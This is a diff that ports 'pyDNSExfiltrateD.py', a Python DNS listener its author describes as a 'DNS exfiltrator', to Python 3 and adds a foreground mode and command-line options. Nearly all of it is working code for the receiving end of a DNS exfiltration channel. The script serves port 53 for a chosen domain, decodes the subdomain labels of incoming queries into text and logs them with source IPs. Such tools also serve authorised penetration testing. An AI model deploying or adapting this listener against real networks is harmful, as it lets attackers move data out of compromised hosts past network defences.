@@ -1,91 +1,164 @@
-#! /bin/env python
+#! /bin/env python3
 
 """
 pyDNSExfiltrateD.py: Act as a DNS listener, and record the lookups to a log file with timestamp & source nameserver IP.
 
-Usage:
-pyDNSExfiltrateD.py start|stop|restart
 
 Example:
-
 > dig this.is.a.test.dns.my.domain.com
-2016-10-18 18:56:57.715478      1.2.3.4   this is a test
+2016-10-18 18:56:57   127.0.0.1          this is a test
 
 Requirements:
-pip install python-daemon dnslib
+python-daemon
+dnslib
 
 History:
 0.1 - this version
+0.2 - Updated to python 3 and added non-daemon (foreground) mode
 """
+__author__ = "b4dpxl"
+__license__ = "GPL"
+__version__ = "0.2"
 
+
+# TODO update to python3 and Printer
+
+from dnslib import DNSRecord, DNSHeader, A, RR
+import daemon
+from daemon import pidfile
+from __printer import Printer
+import argparse
 import datetime
+import os
+import socketserver
+import sys
 import time
 import threading
 import traceback
-import SocketServer
-from dnslib import *
-from daemon import runner
-
-BASE = ".dns.my.domain.com." # change this to match your registered NS. Must end in .
-PID = "/var/run/pyDNS.pid"
-LOG = "/var/log/dnsexfil_results.log"
-# these next 2 need to be changed to /dev/null if this is running as a service
-STDOUT = "/dev/stdout"
-STDERR = "/dev/stderr"
 
 
-class UDPRequestHandler( SocketServer.BaseRequestHandler ):
-  def handle(self):
-
-    now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
-    try:
-      data = self.request[0].strip()
-      request = DNSRecord.parse(data)
-      qname = str( request.q.qname )
-      with open( LOG, 'a' ) as f:
-        f.write( "%s\t%s\t%s\n" % ( now, self.client_address[0], qname[:-len(BASE)].replace( '.', ' ' ) ) )
-
-      reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q, a=RR( qname, rdata=A("127.0.0.1") ) )
-      self.request[1].sendto( reply.pack(), self.client_address )
-
-    except Exception:
-      traceback.print_exc(file=sys.stderr)
+def write(text, file):
+    if file is not None:
+        with open(file, 'a') as f:
+            f.write(text)
 
 
-class App():
+class UDPRequestHandler(socketserver.BaseRequestHandler):
 
-  def __init__(self):
-    self.stdin_path = '/dev/null'
-    self.stdout_path = STDOUT
-    self.stderr_path = STDERR
-    self.pidfile_path =  PID
-    self.pidfile_timeout = 5
+    args = None
+    outfile = None
 
-  def run( self ):
-    print "Starting nameserver..."
-    print "Recording to %s" % LOG
+    def handle(self):
 
-    servers = [
-      SocketServer.ThreadingUDPServer( ( '', 53 ), UDPRequestHandler )
-    ]
+        now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')
+        try:
+            data = self.request[0].strip()
+            request = DNSRecord.parse(data)
+            qname = str(request.q.qname)
+            text = qname[:-(len(self.args.domain)+2)].replace('.', ' ')
+            write("{:<22}{:<18}{}\n".format(now, self.client_address[0], text), self.args.out)
 
-    for s in servers:
-      thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
-      thread.daemon = True  # exit the server thread when the main thread terminates
-      thread.start()
+            if self.args.foreground:
+                Printer().ok("{:<22}{:<18}{}".format(now, self.client_address[0], text))
 
-    try:
-      while 1:
-        time.sleep(1)
+            reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q, a=RR(qname, rdata=A("127.0.0.1")))
+            self.request[1].sendto(reply.pack(), self.client_address)
 
-    except KeyboardInterrupt:
-      pass
-    finally:
-      for s in servers:
-        s.shutdown()
+        except Exception as e:
+            if self.args.foreground:
+                Printer().error("{}".format(e))
+            write("ERROR3: {}\n".format(e), self.args.out)
 
 
-if __name__ == '__main__':
-  app = App()
-  daemon_runner = runner.DaemonRunner(app)
-  daemon_runner.do_action()
+class DNSListener:
+
+    args = None
+
+    def __init__(self, args):
+        self.args = args
+
+    def run(self):
+        server = None
+        try:
+
+            now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
+            write("Starting at {}\n".format(now), self.args.out)
+
+            if self.args.foreground:
+                Printer().info("Starting listener...")
+                Printer().info("Recording to {}".format(self.args.out))
+
+            class MyUDPRequestHandler(UDPRequestHandler):
+                args = self.args
+
+            server = socketserver.ThreadingUDPServer(('', 53), MyUDPRequestHandler)
+            thread = threading.Thread(target=server.serve_forever)  # that thread will start one more thread for each request
+            thread.daemon = True  # exit the server thread when the main thread terminates
+            thread.start()
+
+            if self.args.foreground:
+                Printer().ok("Ready")
+                Printer().info("{:<22}{:<18}Message".format("Time", "IP Address"))
+
+            while 1:
+                time.sleep(1)
+
+        except KeyboardInterrupt:
+            if self.args.foreground:
+                Printer().warn("Shutting down")
+
+        except Exception as e:
+            traceback.print_exc()
+            write("ERROR2: {}\n".format(sys.exc_info()), self.args.out)
+
+        finally:
+            if server is not None:
+                server.shutdown()
+
+
+def main():
+
+    parser = argparse.ArgumentParser(description="""DNS exfiltrator""", formatter_class=argparse.RawTextHelpFormatter)
+    parser.add_argument('-f', action='store_true', dest="foreground", help="Run in the foreground, not as a daemon", required=False, default=False)
+    parser.add_argument('-o', '--out', dest='out', help="Output file", default=None)
+    parser.add_argument('--pid', dest='pid', help="PID file, defaults to '/var/run/pyDNS.pid'", default="/var/run/pyDNS.pid")
+    parser.add_argument('-d', '--domain', dest='domain', help="Your domain name", required=True)
+    parser.add_argument('--version', '-v', action='version', version='%(prog)s {}'.format(__version__))
+    args = parser.parse_args()
+
+    listener = DNSListener(args)
+
+    if args.foreground:
+        try:
+            listener.run()
+        except Exception as e:
+            Printer().error("{}".format(e))
+
+    else:
+        context = None
+        try:
+            if os.path.exists(args.pid):
+                Printer().error("PID file '{}' exists and/or process already running. Did you 'kill -9'?".format(args.pid))
+                sys.exit(1)
+
+            context = daemon.DaemonContext(
+                pidfile=pidfile.PIDLockFile(args.pid)
+                # , stdout=open("/tmp/dns.out", 'w')
+                # , stderr=open("/tmp/dns.err", 'w')
+            )
+            context.open()
+            listener.run()
+
+        except Exception as e:
+            write("ERROR1: {}\n".format(e), args.out)
+
+        finally:
+            try:
+                if context is not None:
+                    context.close()
+            except:
+               pass
+
+
+main()
+
